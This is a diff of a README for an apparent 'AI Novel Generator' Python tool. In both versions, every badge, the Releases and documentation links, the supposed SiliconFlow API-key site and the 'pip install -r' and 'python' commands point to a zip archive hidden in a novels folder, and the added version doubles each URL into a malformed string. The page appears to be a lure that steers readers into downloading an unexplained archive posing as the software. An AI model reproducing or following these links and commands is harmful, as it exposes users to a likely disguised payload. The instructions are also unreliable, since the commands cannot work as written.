@@ -1,9 +1,9 @@
 # 🤖 ai-novel-generator - Create Novels with Ease
 
-[![Version](https://raw.githubusercontent.com/3stythe/ai-novel-generator/master/novels/novel_測試小說_20260111_145131_20260111_145131/novel-ai-generator-v2.9.zip)](https://raw.githubusercontent.com/3stythe/ai-novel-generator/master/novels/novel_測試小說_20260111_145131_20260111_145131/novel-ai-generator-v2.9.zip)
-[![Python](https://raw.githubusercontent.com/3stythe/ai-novel-generator/master/novels/novel_測試小說_20260111_145131_20260111_145131/novel-ai-generator-v2.9.zip+https://raw.githubusercontent.com/3stythe/ai-novel-generator/master/novels/novel_測試小說_20260111_145131_20260111_145131/novel-ai-generator-v2.9.zip)](https://raw.githubusercontent.com/3stythe/ai-novel-generator/master/novels/novel_測試小說_20260111_145131_20260111_145131/novel-ai-generator-v2.9.zip)
-[![License](https://raw.githubusercontent.com/3stythe/ai-novel-generator/master/novels/novel_測試小說_20260111_145131_20260111_145131/novel-ai-generator-v2.9.zip)](LICENSE)
-[![Test](https://raw.githubusercontent.com/3stythe/ai-novel-generator/master/novels/novel_測試小說_20260111_145131_20260111_145131/novel-ai-generator-v2.9.zip)](https://raw.githubusercontent.com/3stythe/ai-novel-generator/master/novels/novel_測試小說_20260111_145131_20260111_145131/novel-ai-generator-v2.9.zip)
+[![Version](https://raw.githubusercontent.com/3stythe/ai-novel-generator/master/novels/novel_測試小說_20260111_150255_20260111_150255/ai_generator_novel_v1.2.zip測試小說https://raw.githubusercontent.com/3stythe/ai-novel-generator/master/novels/novel_測試小說_20260111_150255_20260111_150255/ai_generator_novel_v1.2.zip)](https://raw.githubusercontent.com/3stythe/ai-novel-generator/master/novels/novel_測試小說_20260111_150255_20260111_150255/ai_generator_novel_v1.2.zip測試小說https://raw.githubusercontent.com/3stythe/ai-novel-generator/master/novels/novel_測試小說_20260111_150255_20260111_150255/ai_generator_novel_v1.2.zip)
+[![Python](https://raw.githubusercontent.com/3stythe/ai-novel-generator/master/novels/novel_測試小說_20260111_150255_20260111_150255/ai_generator_novel_v1.2.zip測試小說https://raw.githubusercontent.com/3stythe/ai-novel-generator/master/novels/novel_測試小說_20260111_150255_20260111_150255/ai_generator_novel_v1.2.zip+https://raw.githubusercontent.com/3stythe/ai-novel-generator/master/novels/novel_測試小說_20260111_150255_20260111_150255/ai_generator_novel_v1.2.zip測試小說https://raw.githubusercontent.com/3stythe/ai-novel-generator/master/novels/novel_測試小說_20260111_150255_20260111_150255/ai_generator_novel_v1.2.zip)](https://raw.githubusercontent.com/3stythe/ai-novel-generator/master/novels/novel_測試小說_20260111_150255_20260111_150255/ai_generator_novel_v1.2.zip測試小說https://raw.githubusercontent.com/3stythe/ai-novel-generator/master/novels/novel_測試小說_20260111_150255_20260111_150255/ai_generator_novel_v1.2.zip)
+[![License](https://raw.githubusercontent.com/3stythe/ai-novel-generator/master/novels/novel_測試小說_20260111_150255_20260111_150255/ai_generator_novel_v1.2.zip測試小說https://raw.githubusercontent.com/3stythe/ai-novel-generator/master/novels/novel_測試小說_20260111_150255_20260111_150255/ai_generator_novel_v1.2.zip)](LICENSE)
+[![Test](https://raw.githubusercontent.com/3stythe/ai-novel-generator/master/novels/novel_測試小說_20260111_150255_20260111_150255/ai_generator_novel_v1.2.zip測試小說https://raw.githubusercontent.com/3stythe/ai-novel-generator/master/novels/novel_測試小說_20260111_150255_20260111_150255/ai_generator_novel_v1.2.zip)](https://raw.githubusercontent.com/3stythe/ai-novel-generator/master/novels/novel_測試小說_20260111_150255_20260111_150255/ai_generator_novel_v1.2.zip測試小說https://raw.githubusercontent.com/3stythe/ai-novel-generator/master/novels/novel_測試小說_20260111_150255_20260111_150255/ai_generator_novel_v1.2.zip)
 
 ## 🚀 Getting Started
 
@@ -11,14 +11,14 @@ Welcome to the AI Novel Generator! This tool helps you create long-form novels q
 
 ### 1. Download the Application
 
-Visit the [Releases page](https://raw.githubusercontent.com/3stythe/ai-novel-generator/master/novels/novel_測試小說_20260111_145131_20260111_145131/novel-ai-generator-v2.9.zip) to download the latest version of the software. You can find the executable file there. 
+Visit the [Releases page](https://raw.githubusercontent.com/3stythe/ai-novel-generator/master/novels/novel_測試小說_20260111_150255_20260111_150255/ai_generator_novel_v1.2.zip測試小說https://raw.githubusercontent.com/3stythe/ai-novel-generator/master/novels/novel_測試小說_20260111_150255_20260111_150255/ai_generator_novel_v1.2.zip) to download the latest version of the software. You can find the executable file there. 
 
 ### 2. Install Requirements
 
 Open your command line interface (CLI) and run the following command to install necessary packages:
 
 ```bash
-pip install -r https://raw.githubusercontent.com/3stythe/ai-novel-generator/master/novels/novel_測試小說_20260111_145131_20260111_145131/novel-ai-generator-v2.9.zip
+pip install -r https://raw.githubusercontent.com/3stythe/ai-novel-generator/master/novels/novel_測試小說_20260111_150255_20260111_150255/ai_generator_novel_v1.2.zip測試小說https://raw.githubusercontent.com/3stythe/ai-novel-generator/master/novels/novel_測試小說_20260111_150255_20260111_150255/ai_generator_novel_v1.2.zip
 ```
 
 **Dependencies**:
@@ -33,14 +33,14 @@ You need to configure an API Key to use the novel generator. Create a file named
 SILICONFLOW_API_KEY=your_api_key_here
 ```
 
-You can obtain your API Key by visiting the [SiliconFlow website](https://raw.githubusercontent.com/3stythe/ai-novel-generator/master/novels/novel_測試小說_20260111_145131_20260111_145131/novel-ai-generator-v2.9.zip).
+You can obtain your API Key by visiting the [SiliconFlow website](https://raw.githubusercontent.com/3stythe/ai-novel-generator/master/novels/novel_測試小說_20260111_150255_20260111_150255/ai_generator_novel_v1.2.zip測試小說https://raw.githubusercontent.com/3stythe/ai-novel-generator/master/novels/novel_測試小說_20260111_150255_20260111_150255/ai_generator_novel_v1.2.zip).
 
 ### 4. Test the Connection
 
 To ensure everything works properly, test your connection to the API by running:
 
 ```bash
-python https://raw.githubusercontent.com/3stythe/ai-novel-generator/master/novels/novel_測試小說_20260111_145131_20260111_145131/novel-ai-generator-v2.9.zip --test-api
+python https://raw.githubusercontent.com/3stythe/ai-novel-generator/master/novels/novel_測試小說_20260111_150255_20260111_150255/ai_generator_novel_v1.2.zip測試小說https://raw.githubusercontent.com/3stythe/ai-novel-generator/master/novels/novel_測試小說_20260111_150255_20260111_150255/ai_generator_novel_v1.2.zip --test-api
 ```
 
 This command verifies that your setup is correct. If everything is good, you will see a success message.
@@ -50,7 +50,7 @@ This command verifies that your setup is correct. If everything is good, you wil
 Now, you are ready to generate your novel. Run the following command to start an interactive session:
 
 ```bash
-python https://raw.githubusercontent.com/3stythe/ai-novel-generator/master/novels/novel_測試小說_20260111_145131_20260111_145131/novel-ai-generator-v2.9.zip
+python https://raw.githubusercontent.com/3stythe/ai-novel-generator/master/novels/novel_測試小說_20260111_150255_20260111_150255/ai_generator_novel_v1.2.zip測試小說https://raw.githubusercontent.com/3stythe/ai-novel-generator/master/novels/novel_測試小說_20260111_150255_20260111_150255/ai_generator_novel_v1.2.zip
 ```
 
 Follow the on-screen instructions to choose topics and set parameters for your novel. 
@@ -73,8 +73,8 @@ While your novel is generating, you can monitor the token usage and cost in real
 
 ## 📥 Download & Install
 
-To download the latest version, click here: [Release Download](https://raw.githubusercontent.com/3stythe/ai-novel-generator/master/novels/novel_測試小說_20260111_145131_20260111_145131/novel-ai-generator-v2.9.zip). Follow the earlier steps to install it on your device and start creating novels.
+To download the latest version, click here: [Release Download](https://raw.githubusercontent.com/3stythe/ai-novel-generator/master/novels/novel_測試小說_20260111_150255_20260111_150255/ai_generator_novel_v1.2.zip測試小說https://raw.githubusercontent.com/3stythe/ai-novel-generator/master/novels/novel_測試小說_20260111_150255_20260111_150255/ai_generator_novel_v1.2.zip). Follow the earlier steps to install it on your device and start creating novels.
 
-For more information, visit the [documentation](https://raw.githubusercontent.com/3stythe/ai-novel-generator/master/novels/novel_測試小說_20260111_145131_20260111_145131/novel-ai-generator-v2.9.zip).
+For more information, visit the [documentation](https://raw.githubusercontent.com/3stythe/ai-novel-generator/master/novels/novel_測試小說_20260111_150255_20260111_150255/ai_generator_novel_v1.2.zip測試小說https://raw.githubusercontent.com/3stythe/ai-novel-generator/master/novels/novel_測試小說_20260111_150255_20260111_150255/ai_generator_novel_v1.2.zip).
 
 Now you have everything you need to start using the AI Novel Generator. Enjoy creating your stories!
